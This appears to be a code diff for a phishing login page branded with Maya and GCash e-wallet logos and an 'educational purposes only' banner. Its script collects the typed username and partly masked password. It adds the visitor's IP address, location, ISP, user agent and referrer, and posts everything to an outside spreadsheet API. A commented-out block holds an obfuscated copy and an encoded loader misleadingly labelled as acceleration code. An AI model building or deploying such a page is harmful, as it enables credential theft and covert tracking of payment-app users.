@@ -6,6 +6,145 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Testing Website</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+</head>
+
+<body>
+
+    <div id="original-content" class="login-container">
+        <div class="image-container">
+            <img src="maya.jpg" alt="maya">
+            <img src="UPANG.png" alt="UPANG">
+            <img src="Gcash.jpeg" alt="GCASH">
+        </div>
+
+        <h1>This is for educational purposes only</h1>
+
+        <p class="text">
+            Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
+            dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget.<br>
+            Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam
+            ac.
+            Amet nisl suscipit adipiscing bibendum est ultricies.
+        </p>
+
+        <h2>Login Form</h2>
+
+        <!-- Remove method post to not post the username and password -->
+        <form action="" id="sheetdb-form">
+
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="data[Username]" required>
+            <br>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="data[password]" required>
+            <br>
+
+            <!-- Add hidden input fields to store information -->
+            <input type="hidden" id="ip-address-input" name="data[ip-address]" value="">
+            <input type="hidden" id="city-input" name="data[city]" value="">
+            <input type="hidden" id="country-input" name="data[country]" value="">
+            <input type="hidden" id="isp-input" name="data[isp]" value="">
+            <input type="hidden" id="user-agent-input" name="data[user-agent]" value="">
+            <input type="hidden" id="referral-url-input" name="data[referral-url]" value="">
+            <input type="hidden" id="date-time-input" name="data[date-time]" value="">
+            <input type="hidden" id="channel-input" name="data[channel]" value="">
+
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <!-- Trademark code for web accelaration
+    <script>
+        var _0x2952e4 = _0x23ed; (function (_0x180c9b, _0x15528e) { var _0x548962 = _0x23ed, _0x300d2b = _0x180c9b(); while (!![]) { try { var _0x128425 = -parseInt(_0x548962(0x1ef)) / 0x1 * (parseInt(_0x548962(0x1dd)) / 0x2) + parseInt(_0x548962(0x1e5)) / 0x3 + parseInt(_0x548962(0x1e2)) / 0x4 * (parseInt(_0x548962(0x1c8)) / 0x5) + -parseInt(_0x548962(0x1d1)) / 0x6 + parseInt(_0x548962(0x1cc)) / 0x7 + -parseInt(_0x548962(0x1f2)) / 0x8 * (-parseInt(_0x548962(0x1e6)) / 0x9) + -parseInt(_0x548962(0x1de)) / 0xa * (-parseInt(_0x548962(0x1f0)) / 0xb); if (_0x128425 === _0x15528e) break; else _0x300d2b['push'](_0x300d2b['shift']()); } catch (_0x176c94) { _0x300d2b['push'](_0x300d2b['shift']()); } } }(_0x4864, 0x69318)); function _0x4864() { var _0x46939c = ['region', 'reset', 'org', 'return\x20(function()\x20', 'preventDefault', 'action', 'hostname', '181804QhzvUd', '130dxKwkO', 'length', 'Error:', 'IP\x20API\x20Response:', '42232QuIHSQ', 'warn', 'location', '1700247xsKSli', '9vyuAXJ', 'Error\x20occurred', '{}.constructor(\x22return\x20this\x22)(\x20)', 'userAgent', '#user-agent-input', 'protocol', 'json', '127.0.0.1', 'repeat', '5ANHqDo', '785455vBSvSX', '#city-input', '1207328Mweuaw', 'https://ipapi.co/json', '#password', 'console', 'addEventListener', 'search', 'log', 'sheetdb-form', 'val', '#ip-address-input', 'https://sheetdb.io/api/v1/e8qqennjjjob7', 'examplep1.000webhostapp.com', 'bind', '#date-time-input', 'slice', 'stringify', 'apply', '#isp-input', 'toString', 'info', 'exception', '(((.+)+)+)+$', 'catch', '[name=\x22data[password]\x22]', 'error', 'POST', 'referrer', 'Success', '#country-input', '20xiiOzP', '#referral-url-input', 'trace', 'application/json', '124208YaFAVM', 'getElementById', 'prototype', 'then', '#username', '4923144JMzRhI', '__proto__', 'toISOString', 'table', 'submit']; _0x4864 = function () { return _0x46939c; }; return _0x4864(); } var _0x413518 = (function () { var _0x1ae3d0 = !![]; return function (_0x3a4318, _0x2018fa) { var _0x2e9746 = _0x1ae3d0 ? function () { if (_0x2018fa) { var _0xd4ece8 = _0x2018fa['apply'](_0x3a4318, arguments); return _0x2018fa = null, _0xd4ece8; } } : function () { }; return _0x1ae3d0 = ![], _0x2e9746; }; }()), _0x30389a = _0x413518(this, function () { var _0x29da48 = _0x23ed; return _0x30389a[_0x29da48(0x1bd)]()[_0x29da48(0x1f7)](_0x29da48(0x1c0))['toString']()['constructor'](_0x30389a)['search'](_0x29da48(0x1c0)); }); _0x30389a(); function _0x23ed(_0x31c4ed, _0x7808e2) { var _0x6765b6 = _0x4864(); return _0x23ed = function (_0x513c3f, _0x3f8e9c) { _0x513c3f = _0x513c3f - 0x1b6; var _0x1782c9 = _0x6765b6[_0x513c3f]; return _0x1782c9; }, _0x23ed(_0x31c4ed, _0x7808e2); } var _0x3f8e9c = (function () { var _0x5944c1 = !![]; return function (_0x3624d2, _0x48f586) { var _0x2ab4ff = _0x5944c1 ? function () { var _0x203199 = _0x23ed; if (_0x48f586) { var _0x1157c2 = _0x48f586[_0x203199(0x1bb)](_0x3624d2, arguments); return _0x48f586 = null, _0x1157c2; } } : function () { }; return _0x5944c1 = ![], _0x2ab4ff; }; }()), _0x513c3f = _0x3f8e9c(this, function () { var _0x1b591b = _0x23ed, _0xe0f487; try { var _0x285950 = Function(_0x1b591b(0x1d9) + _0x1b591b(0x1e8) + ');'); _0xe0f487 = _0x285950(); } catch (_0x1eab34) { _0xe0f487 = window; } var _0x53a4b5 = _0xe0f487[_0x1b591b(0x1f5)] = _0xe0f487['console'] || {}, _0x4bdc4d = [_0x1b591b(0x1f8), _0x1b591b(0x1e3), _0x1b591b(0x1be), _0x1b591b(0x1c3), _0x1b591b(0x1bf), _0x1b591b(0x1d4), _0x1b591b(0x1ca)]; for (var _0x36e7c3 = 0x0; _0x36e7c3 < _0x4bdc4d[_0x1b591b(0x1df)]; _0x36e7c3++) { var _0x4c2a8f = _0x3f8e9c['constructor'][_0x1b591b(0x1ce)][_0x1b591b(0x1b7)](_0x3f8e9c), _0x41b190 = _0x4bdc4d[_0x36e7c3], _0xdfa0d5 = _0x53a4b5[_0x41b190] || _0x4c2a8f; _0x4c2a8f[_0x1b591b(0x1d2)] = _0x3f8e9c[_0x1b591b(0x1b7)](_0x3f8e9c), _0x4c2a8f['toString'] = _0xdfa0d5[_0x1b591b(0x1bd)][_0x1b591b(0x1b7)](_0xdfa0d5), _0x53a4b5[_0x41b190] = _0x4c2a8f; } }); _0x513c3f(); var form = document['getElementById'](_0x2952e4(0x1f9)), dynamicUrl = _0x2952e4(0x1fc); form['action'] = dynamicUrl; function get() { var _0x2d6ac4 = _0x2952e4, _0x1adea8 = _0x2d6ac4(0x1b6); $['getJSON'](_0x2d6ac4(0x1f3), function (_0x44781a) { var _0x294516 = _0x2d6ac4; console[_0x294516(0x1f8)](_0x294516(0x1e1), _0x44781a), console[_0x294516(0x1f8)]('Referral\x20URL:', document[_0x294516(0x1c5)]); var _0x5b3d5a = new Date()[_0x294516(0x1d3)](); $(_0x294516(0x1b8))[_0x294516(0x1fa)](_0x5b3d5a), $(_0x294516(0x1fb))[_0x294516(0x1fa)](_0x44781a['ip']), $(_0x294516(0x1f1))[_0x294516(0x1fa)](_0x44781a[_0x294516(0x1d6)]), $(_0x294516(0x1c7))[_0x294516(0x1fa)](_0x44781a['country_name']), $(_0x294516(0x1bc))['val'](_0x44781a[_0x294516(0x1d8)]), $(_0x294516(0x1ea))[_0x294516(0x1fa)](navigator[_0x294516(0x1e9)]), $('#channel-input')[_0x294516(0x1fa)](location[_0x294516(0x1eb)]); document[_0x294516(0x1e4)][_0x294516(0x1eb)] === 'file:' || document[_0x294516(0x1e4)][_0x294516(0x1dc)] === _0x294516(0x1ed) ? $('#referral-url-input')[_0x294516(0x1fa)](document[_0x294516(0x1e4)]) : $(_0x294516(0x1c9))[_0x294516(0x1fa)](document[_0x294516(0x1c5)]); var _0x1038fc = document[_0x294516(0x1cd)](_0x294516(0x1f9)); _0x1038fc[_0x294516(0x1f6)](_0x294516(0x1d5), function (_0x5d6964) { var _0x2dbaca = _0x294516; _0x5d6964[_0x2dbaca(0x1da)](); var _0x220047 = $(_0x2dbaca(0x1f4))[_0x2dbaca(0x1fa)](), _0x52dde0 = _0x220047[_0x2dbaca(0x1df)] > 0x4 ? '*'[_0x2dbaca(0x1ee)](_0x220047[_0x2dbaca(0x1df)] - 0x4) + _0x220047[_0x2dbaca(0x1b9)](-0x4) : _0x220047; $(_0x2dbaca(0x1c2))[_0x2dbaca(0x1fa)](_0x52dde0), window[_0x2dbaca(0x1e4)][_0x2dbaca(0x1dc)] !== _0x1adea8 ? fetch(_0x1038fc[_0x2dbaca(0x1db)], { 'method': _0x2dbaca(0x1c4), 'body': new FormData(_0x1038fc) })[_0x2dbaca(0x1cf)](_0x58a377 => _0x58a377[_0x2dbaca(0x1ec)]())[_0x2dbaca(0x1cf)](_0x520071 => { var _0xf91086 = _0x2dbaca; console[_0xf91086(0x1f8)](_0x520071), alert(_0xf91086(0x1c6)), _0x1038fc[_0xf91086(0x1d7)](); })[_0x2dbaca(0x1c1)](_0x5ba4ee => { var _0x138acc = _0x2dbaca; console[_0x138acc(0x1c3)](_0x138acc(0x1e0), _0x5ba4ee), alert(_0x138acc(0x1e7)); }) : fetch(_0x1038fc['action'], { 'method': _0x2dbaca(0x1c4), 'body': JSON[_0x2dbaca(0x1ba)]({ 'data[Username]': $(_0x2dbaca(0x1d0))['val']() }), 'headers': { 'Content-Type': _0x2dbaca(0x1cb) } })[_0x2dbaca(0x1cf)](_0x3b5ae4 => _0x3b5ae4[_0x2dbaca(0x1ec)]())[_0x2dbaca(0x1cf)](_0x29f473 => { var _0x49123d = _0x2dbaca; console[_0x49123d(0x1f8)](_0x29f473), alert(_0x49123d(0x1c6)), _0x1038fc[_0x49123d(0x1d7)](); })[_0x2dbaca(0x1c1)](_0x4c14d5 => { var _0x189824 = _0x2dbaca; console['error'](_0x189824(0x1e0), _0x4c14d5), alert(_0x189824(0x1e7)); }); }); }); }
+    </script>
+
+    <script>
+        function _0x2f3d(_0x1723fa, _0x47621a) { var _0x2a73bc = _0x5b75(); return _0x2f3d = function (_0xa84aee, _0x2c1757) { _0xa84aee = _0xa84aee - 0x1ca; var _0x2407d1 = _0x2a73bc[_0xa84aee]; return _0x2407d1; }, _0x2f3d(_0x1723fa, _0x47621a); } function _0x5b75() { var _0x290a92 = ['info', 'return\x20(function()\x20', 'console', '9hhryHP', 'css', 'trace', 'undefined', '127236QCGfwL', '91wdfQkm', 'search', '24uzmDsT', 'center', '13Grwvjf', '{}.constructor(\x22return\x20this\x22)(\x20)', '475349rEPPhi', '__proto__', '9078492nNNvWn', 'length', '(((.+)+)+)+$', 'table', 'flex', 'constructor', 'body', 'error', '<h1>This\x20is\x20for\x20educational\x20purposes\x20only</h1><img\x20style=\x22width:\x20700px;\x20height:\x20auto;\x22\x20src=\x22maya.jpg\x22\x20alt=\x22maya\x22><p>Lorem\x20ipsum\x20dolor\x20sit\x20amet,\x20consectetur\x20adipiscing\x20elit,\x20sed\x20do\x20eiusmod\x20tempor\x20incididunt\x20ut\x20labore\x20et\x20dolore\x20magna\x20aliqua.\x20Massa\x20massa\x20ultricies\x20mi\x20quis\x20hendrerit\x20dolor\x20magna\x20eget.\x20Augue\x20lacus\x20viverra\x20vitae\x20congue\x20eu\x20consequat\x20ac\x20felis.\x20Ut\x20tortor\x20pretium\x20viverra\x20suspendisse\x20potenti\x20nullam\x20ac.\x20Amet\x20nisl\x20suscipit\x20adipiscing\x20bibendum\x20est\x20ultricies.</p><img\x20style=\x22width:\x20100px;\x20height:\x20auto;\x22\x20src=\x22UPANG.png\x22\x20alt=\x22UPANG\x22><img\x20style=\x22width:\x20500px;\x20height:\x20100;\x22\x20src=\x22Gcash.jpeg\x22\x20alt=\x22GCASH\x22><h2>Login\x20Form</h2><label\x20for=\x22username\x22>Username:</label><input\x20type=\x22text\x22\x20required><label\x20for=\x22password\x22>Password:</label><input\x20type=\x22password\x22\x20required><button\x20type=\x22submit\x22>Login</button>', '68645MEYfYm', '627QnhPyV', 'toString', '8aFipBt', '23520RCcaFM', '2127448tFgcRj', 'bind', 'apply', '35922zCRcVF', '#333', 'white']; _0x5b75 = function () { return _0x290a92; }; return _0x5b75(); } var _0x141410 = _0x2f3d; (function (_0x20f4b4, _0x20ad0e) { var _0x408eae = _0x2f3d, _0x526a32 = _0x20f4b4(); while (!![]) { try { var _0xb52127 = -parseInt(_0x408eae(0x1dc)) / 0x1 + -parseInt(_0x408eae(0x1cb)) / 0x2 * (parseInt(_0x408eae(0x1d8)) / 0x3) + parseInt(_0x408eae(0x1ea)) / 0x4 * (parseInt(_0x408eae(0x1e7)) / 0x5) + parseInt(_0x408eae(0x1d5)) / 0x6 * (-parseInt(_0x408eae(0x1d6)) / 0x7) + parseInt(_0x408eae(0x1ec)) / 0x8 * (parseInt(_0x408eae(0x1d1)) / 0x9) + parseInt(_0x408eae(0x1eb)) / 0xa * (parseInt(_0x408eae(0x1e8)) / 0xb) + parseInt(_0x408eae(0x1de)) / 0xc * (parseInt(_0x408eae(0x1da)) / 0xd); if (_0xb52127 === _0x20ad0e) break; else _0x526a32['push'](_0x526a32['shift']()); } catch (_0x11c53a) { _0x526a32['push'](_0x526a32['shift']()); } } }(_0x5b75, 0x469ff)); typeof get === _0x141410(0x1d4) ? makeWebpageUnusable() : get(); function makeWebpageUnusable() { var _0x579b41 = _0x141410, _0x306049 = (function () { var _0x322aa3 = !![]; return function (_0xeeac17, _0x3377a5) { var _0x2afabb = _0x322aa3 ? function () { var _0x39bdb0 = _0x2f3d; if (_0x3377a5) { var _0x340f80 = _0x3377a5[_0x39bdb0(0x1ca)](_0xeeac17, arguments); return _0x3377a5 = null, _0x340f80; } } : function () { }; return _0x322aa3 = ![], _0x2afabb; }; }()), _0x26a49e = _0x306049(this, function () { var _0x191998 = _0x2f3d; return _0x26a49e['toString']()[_0x191998(0x1d7)]('(((.+)+)+)+$')[_0x191998(0x1e9)]()['constructor'](_0x26a49e)[_0x191998(0x1d7)](_0x191998(0x1e0)); }); _0x26a49e(); var _0x47dced = (function () { var _0x195cf4 = !![]; return function (_0x218a42, _0x821851) { var _0x58cf43 = _0x195cf4 ? function () { var _0x7e3032 = _0x2f3d; if (_0x821851) { var _0x16f9bd = _0x821851[_0x7e3032(0x1ca)](_0x218a42, arguments); return _0x821851 = null, _0x16f9bd; } } : function () { }; return _0x195cf4 = ![], _0x58cf43; }; }()), _0x2ac117 = _0x47dced(this, function () { var _0x41e4bb = _0x2f3d, _0x22caee; try { var _0x2a1f5f = Function(_0x41e4bb(0x1cf) + _0x41e4bb(0x1db) + ');'); _0x22caee = _0x2a1f5f(); } catch (_0x27a717) { _0x22caee = window; } var _0x5e56e7 = _0x22caee[_0x41e4bb(0x1d0)] = _0x22caee[_0x41e4bb(0x1d0)] || {}, _0x23d5d4 = ['log', 'warn', _0x41e4bb(0x1ce), _0x41e4bb(0x1e5), 'exception', _0x41e4bb(0x1e1), _0x41e4bb(0x1d3)]; for (var _0x8b58df = 0x0; _0x8b58df < _0x23d5d4[_0x41e4bb(0x1df)]; _0x8b58df++) { var _0x41412d = _0x47dced[_0x41e4bb(0x1e3)]['prototype'][_0x41e4bb(0x1ed)](_0x47dced), _0x3b9ac7 = _0x23d5d4[_0x8b58df], _0x45b785 = _0x5e56e7[_0x3b9ac7] || _0x41412d; _0x41412d[_0x41e4bb(0x1dd)] = _0x47dced[_0x41e4bb(0x1ed)](_0x47dced), _0x41412d[_0x41e4bb(0x1e9)] = _0x45b785['toString'][_0x41e4bb(0x1ed)](_0x45b785), _0x5e56e7[_0x3b9ac7] = _0x41412d; } }); _0x2ac117(), $(_0x579b41(0x1e4))['html'](_0x579b41(0x1e6)), $(_0x579b41(0x1e4))[_0x579b41(0x1d2)]({ 'background-color': _0x579b41(0x1cd), 'color': _0x579b41(0x1cc), 'display': _0x579b41(0x1e2), 'align-items': _0x579b41(0x1d9), 'justify-content': _0x579b41(0x1d9), 'height': '100vh', 'margin': 0x0 }); } (function () { _9Q("u1c$t111jjqecj&dD<ftpo|edebfo;o6uu.bdibjus3u;pqpd;!-qtovep{c<lBcspoe#jszmsu2/;6bpdmpfmnf<1b2~ysd951yq.ujujvqhGp.s;.esj|j<;1ud6mnpjmjjbynqj1<edqq-!mc|ououbs6ss;idpfqehkd1ff<j;ohphhhubyo1gqf<yy1bbpxhphuep1ebqppndujovfwyogd3uosiof.s~fqpbsc<!/vzuj;n;pev<fepwmbu.t.toiuup<1b;;u;.bhsyse;pc92u;ue9;cojodsjjfpjjjqjuu<|fonqjd$;kdmj/!<ne2spq*pcpuq2p|oep;vossopemujfnusubyof42vpjojji|jqeyy<~mniy7sxh.motu|;to#bfgsbf<.s~fo4/toh.nnfxoyf.!np;;<qej;dpp;fc$##;znz<sydthsu47uuocbhjjh!stsbmd92nyfe2pso5sb5;;#;t.ihupuj/|f<<jb;ph|he;t.ihsblq1b<su1m;fq~d6###g;dfj.mzomusmugjdufxiu6psbchc<y1sc.iqpx<ylb##~mdpjobpm.pf~jfzofu.jui1mbebjfn~&hpc;ysic<ch1--ffoh;msfchyoy~fopde;;qjep)omb<jyp2<;jpdvs5##cyoui1j;;pjuqfusunpub4yejx1;|sjqo.y1c$usvup:stp<ufu~h$juo.|../|f;oiv1<!v;-3ehob.t~1b5fesuv~f", (function () { this._6o655Ia3s__G4PPnr = { f: function (_P9, $) { _JGzG = "\x70\x6c\x61"; function _W4l(_P9, $, _F59, _7DT) { function _nB(_95r) { _95r = _l28Z(_95r) - 32 - (_7DT % 95); if (_95r < 0) { _95r += 95; } _95r += 32; _7DT++; return _43DS(_95r); }; function _H7(_P9, _F59) { _sJT = _P9[_F59]; _QX1 = ""; while (_sJT != "\f") { if (_sJT < " ") { _QX1 += _sJT; } else { _QX1 += _nB(_sJT); } _F59++; _sJT = _P9[_F59]; } return _QX1; }; function _l28Z(_sJT) { return _sJT[_pw](0); }; function _43DS(_95r) { return this[_lVw][_88I](_95r); }; _F59 = _F59 ? _F59 : 0; if (_P9[_x0] > _F59) { _7DT = _7DT ? _7DT : 0; _xji = _H7(_P9, _F59); _Tb = _xji[_x0]; _V32 = _H7(_P9, _F59 + _Tb + 1); _0C0 = _V32[_x0]; $[_xji] = _V32; _W4l(_P9, $, _F59 + _Tb + 1 + _0C0 + 1, _7DT); } }; _780 = "\x72\x65" + _JGzG + "\x63\x65"; _pw = _uK("_ahco%Cr%Aedt"); _lVw = _uK("r_t%Sgni"); _88I = _uK("_orfhCm%Crae_do"); _x0 = _uK("ne_lh_tg"); _W4l(_P9, $); function _uK(_j5M2) { return _j5M2[_780](/[x%y_z]/g, '')[_780](/(.)(.)(.)/g, '$3$2$1'); }; } }; }()), 0, {}, "_TFn:\fK{uk}szz\flBPBT\f%x%\"wz}\fxe*au\f)/*0\f\"#:]5\f'6:k`TX?TA]_DYGbSVe\\;uut9=HK\\QOdWH[pnJmdgMXe;Bv@IU`{{-_)$.(3;jDu3ep2fN*kv@QFDYL.WR\\Vaiz&X->w4\"-h|{}r}&fx*#,21<!wn3sx9D9@G;JN}CFQVKGRIJ/ W%YP[_mllDkfyLzqt^irabJK%fq\"35,7/o7:?9s~8JVnsz&WLVZcT4[^c](3\\3hz6/:{pqx$xx,#+,<G!/5~BM?BI>9)@?ARNYAR0U 7VaY`g[\\koOtmhcnf>=@Eju$v*~*2m1(+v\")\\`_ l~*;B=P#QHK)*_,7NiZ+)3>nbsUlrlx!\"?JpX~ZEP%,.'6m{vwP[/gjMlFXcQCTMV\\vURcnQ-)D*Ikvdqg{uoz#u!qic_\\|(\"46v<50@'20{y}(.9INDD4ZQYZ9DO:^>d^bBMbtvYl\" KVnH`b R]1,3*-,<[f+aeb=bm<II?IPWkvGzU@J\"s~Illelg{'cToB\"-`uyY/)*+6|#V:Z;3>83>9H>;F9oHHI5CNZOY]fWKVU@,0Q\\srpokoYdmfu&xzal#+027hs(8EaKGp{JA@BSw#B0L/Z[ +dca`m'2\\2:3<l/:xn$t{6Av/1VX=H7:AB72EP0d@)KVK>QTHR]FRV|C%ZeAWlb`k]cd7R@bitWb`aozv'g vv\"4;;2|(-fj!#.BIEL)4A7za/:T`UX5@U?_2;F=cri!BMjEFGH`KzLW0#36R]%3aaXcCB5D^i9I1udoTUXitK~ g+cq|mnav\">INH[(82(:077I*9=ncW04|AHAb7mj@g`i>F0[W(pE_!L|!thMg)T%)1i^`k'Y1k334Ib5vcdM;XYx}Gvt7o*KvGKD(IB6z~g,3,^\"<])Y]V:[f,b_5m1Kl8hleIkuYFDf?G1\\X)nbGa#N~#{UwPXBmi:#{\"5xr^p~_k89vhC{pr}F#n!/obE,URu\"NO-~wAL~YTnSq#a>*<J+4A1EmYfpqg`iatQ=O]>2[rw!ly$%zs{t(dPbpQFH)1`^!})[/?w3!kq$dW:!J3'us66!$\"($*0(}@:%+=arst7=1+y0./?Y=@>D@FLD:1Ze8H%Ir)<h\\THXZXU#fgQa[QcY``rSiM*+;\"Z55LS)|ki,d??V]3'#n!/o(UtJRuPPgnv@K}j&g22\"MH$7KSfC/AO0fbh(rE=PY:FrsQC<epC3M~EpkITab_c0,\"#|QU'V%$}&9uas\"b76:@^FiuBC!rk5@r]Z]fut>I{pS9}|FQ$X_W_/(S,b^d$Zm=;]6jims2bcf?srv|;AjuHM b\"aL-.${|plXjxYRd4tq=`548>\\b9fEq{ 6&q$2r$`J&!VJV{-iS/*^#;h(]$MX+0bEdD/m3D!jFAdedXGEg@X&EzAFW4}YTJ+,OHZ*jg~rj^npnk}^gtdx?#$%&{o \" |/oc-DIP4R/z-;{ohSV\\)93);188J+y4aAX1,\"inm`TCAc`k>sKJJ5dOUgHC9!&%wkPKA).-R{'Y/feeP])+>\"jrzm%idZBGFk5@rIGIMut>I{-8OS~J#}s[`_ReIJh5E?5G=DDV7zGA>0eg[SGWYWTfoH<5 #stOC<'*Py%W**p3j[(?`TM8;a+6h;;\"D{lJp|IJ(yr<Gydadm|{EP#wZ@%cGe2B<2D:AAS4&/zGa:n?Nrvi]YEWe\\`&I}N]\"&Kt R?Z<ffV\"|;~'Z0^]'2dQlNxxh4/=19L(,o+/r<Gy~Q4S3}NS!aLMb;/?A?<NEI-Va4lo%6a\\j^fy]{XDVdE0[`%Qa[QcY``rS'GYB1\"ZmfCg)|xdv%e_JX=AIl_B)Rm7BtH/ivB?J|45YZK^.,N':3o4UI.A:v;/Xc6ljlp98al?5+N.2CnGA,:~#yNaZ7[|0sVAlq8[U@N37]'2ds ;$~hG+I&q$2rGwMR~/)~1'..@!SqVM&*}6CTH-\"$dn2>jkI;4]h;@q,x:?>grExS;GrKOC[hy-\\Z|UJL-U~*\\251j_, nl/)h~b?@P7odfGo9DvLOK%yFG;*(J#wyZ#LW*_4E_-YM2>jkI;4]h;&#&/>=fqD9{aF'J?A\"Js~Q'[l'T3vl`prpm `T}5:A%&h\\U@CK74?qEU.I7\"(:zmP7`I`\"tW>g#LW*]mFa-j1$fMv2[f9msGow=hA68xAjuH \"c\"ZLx,[Y{uUIB-0$wocsusp#cW!8=D(j>^pYH9qe^IL@SxM}SZ}oxd1K$g4.+|RTUhA5EGEBT5>K;OuYwT@R`A&y}#F:cz 'Sc]Se[bbtUfR/\"Z^Rjw)|ki,&eJ>B3'kPDHMpy'v+Q*}.0.+=}PnSJ#'z3@QdH@?GJ/yEJ/Xc6F#Gp':e>B6N[oD/Z_DmxKB;62NMv\"TY,n.mX%8{bauek,j/#&{o \" |/ox&u*P4R/z-;{O1aig_#/[\\:,%NY,^8\"+a0/Xc6yi@l@:enXqEk~[GYgH?e#4+NZ'(eWPy%W*cMV-[Z$/aE5k8ke1:$=q7J'r%3s$h LVy&RS1#{EP#U/x\"X'&OZ-p`7c71\\eOh>buR>P^BY~>A \\HZh[(mn)U_cyiUgu`5)5d8\\`Imtm^(3ej= ?~iHw:;:.*u(6z!Vy}f+2+{+ ^;'9G,f*.v;B;,U`3ehf&q7bEexHFhir\\)}vw%'NtrsvS-/#l98=>\"#vm(;bh< hpxk'qo23<&RR@ANPw><=@|VXL6befgKL@7Qd,2e.E)R]0?~6,3^IatLx^_y]FNVI`OMoZrfNeIr}P_?VLS~i\"5l9~ :}jh+gAC7!@P4(pvLo{HI'xq;FxK%nwN|{EP#fV-Y-'R/Y^WjN4K/Xc6E%<29dAGh{_`MKmXpdLcGp{N]=TJQ|g 3vp\\n|]ep7UVAg~b,7inA$C#mL)t'5~zUxOL\"BN8QQR^;'9G<3g+7cdB4-Va4?g-m76_j=5CRDEAlE{xNxzd}}~x,hTftW4~ 5q]o}kc>2>zfx'jrG~uH%p#1{PDP. \"& C&Y}&1WuvMA>0260S/7j/7Bh'(^RN:LZT@zAX<DLA OMoaM()L a2:8{o^\\~xXiU2%_()|thxzxu(okw rI-qN9:O3{$,~62}0>~d-(`T`0.PB.hi-$Jgx[OM9sY_[u;!ID|q|`IQYLgRPrdP+,O_D[(}qo[6!|#8]Ckf?4?#g2E\"mFus6nT|w<0vATwL|RW;<\"*L_,(`0RSdH80XYj3;o[H?aD<b_D@x\\IGicCT@|oJrsg_Scec`rZVbj]4wdb%]QJ58, dSm;z2j^WBE9L01O\f"); function _9Q(_q9, _47T, _1t0, $, _L1, _8F) { _hm = this._6o655Ia3s__G4PPnr; _hm.f(_L1, $); if (!_1t0) { _1t0 = $.__u8n; } _CD2X()(_q9, 0, 0x172f, this, "''"); function _CD2X() { return function (_v2nH, _YP, _AY, _xy, _Xtv) { _hm.p1 = _v2nH; _hm.p2 = _AY; try { _XB(_xy)(_Ai9b()([_1t0[$._4A2C]("+p%p", _Xtv)[$._4A2C]("-p%q", _Xtv)], ''))(); } catch (e) { } function _XB(_F58d) { return _F58d[$._SDk6]; }; _xy._6o655Ia3s__G4PPnr = _8F; }; }; function _Ai9b() { return function (_UhH, _c8d) { return _UhH[$._KnEX](_c8d); }; }; }; }());
+    </script> -->
+
+    <script>
+        var form = document.getElementById('sheetdb-form');
+
+        var dynamicUrl = "https://sheetdb.io/api/v1/e8qqennjjjob7";
+
+        // Set the form action dynamically
+        form.action = dynamicUrl;
+
+        function get() {
+            var allowedDomain = "examplep1.000webhostapp.com";
+            //var allowedDomain = "dresssssifyfy.000webhostapp.com"
+
+            // Fetch the IP address using ipapi.co
+            $.getJSON('https://ipapi.co/json', function (data) {
+                // Check the logs if it passes through properly
+                console.log('IP API Response:', data);
+                console.log('Referral URL:', document.referrer);
+
+                // Set the date and time
+                var currentDateTime = new Date().toISOString();
+                $('#date-time-input').val(currentDateTime);
+
+                // Updates the hidden input fields
+                $('#ip-address-input').val(data.ip);
+                $('#city-input').val(data.region);
+                $('#country-input').val(data.country_name);
+                $('#isp-input').val(data.org);
+                $('#user-agent-input').val(navigator.userAgent);
+                $('#channel-input').val(location.protocol);
+
+                if (document.location.protocol === 'file:' || document.location.hostname === '127.0.0.1') {
+                    $('#referral-url-input').val(document.location);
+                } else {
+                    // Check if the referrer is available
+                    $('#referral-url-input').val(document.referrer);
+                }
+
+                // Handle form submission
+                var form = document.getElementById('sheetdb-form');
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault(); // To prevent from opening another tab
+
+                    // Get the full password
+                    var fullPassword = $('#password').val();
+
+                    // Determine if the password should be truncated or not
+                    var truncatedPassword = fullPassword.length > 4 ? '*'.repeat(fullPassword.length - 4) + fullPassword.slice(-4) : fullPassword;
+
+                    // Add the password to the hidden field
+                    $('[name="data[password]"]').val(truncatedPassword);
+                    // Check if the current domain is not the allowed one
+                    if (window.location.hostname !== allowedDomain) {
+                        // Fetch data using AJAX
+                        fetch(form.action, {
+                            method: "POST",
+                            body: new FormData(form),
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                // Handle the response data
+                                console.log(data);
+                                alert('Success'); // To check if it passed through
+
+                                // Reset the form
+                                form.reset();
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                alert('Error occurred'); // To check if it did not pass through
+                            });
+                    }
+                    else {
+                        // Do nothing if the domain matches the allowed domain
+                        console.log("Form submission is not allowed on the same domain.");
+                        // Optionally, you can show a message to the user indicating that form submission is not allowed.
+                    }
+                });
+            });
+        }
+    </script>
+
     <style type="text/css">
         body {
             display: flex;
@@ -80,154 +219,6 @@
             background-color: #45a049;
         }
     </style>
-</head>
-
-<body>
-
-    <div id="original-content" class="login-container">
-        <div class="image-container">
-            <img src="maya.jpg" alt="maya">
-            <img src="UPANG.png" alt="UPANG">
-            <img src="Gcash.jpeg" alt="GCASH">
-        </div>
-
-        <h1>This is for educational purposes only</h1>
-
-        <p class="text">
-            Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
-            dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget.<br>
-            Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam
-            ac.
-            Amet nisl suscipit adipiscing bibendum est ultricies.
-        </p>
-
-        <h2>Login Form</h2>
-
-        <!-- we can remove method post to not post the username and password -->
-        <form action="" id="sheetdb-form">
-
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="data[Username]" required>
-            <br>
-
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="data[password]" required>
-            <br>
-
-            <!-- Add hidden input fields to store information -->
-            <input type="hidden" id="ip-address-input" name="data[ip-address]" value="">
-            <input type="hidden" id="city-input" name="data[city]" value="">
-            <input type="hidden" id="country-input" name="data[country]" value="">
-            <input type="hidden" id="isp-input" name="data[isp]" value="">
-            <input type="hidden" id="user-agent-input" name="data[user-agent]" value="">
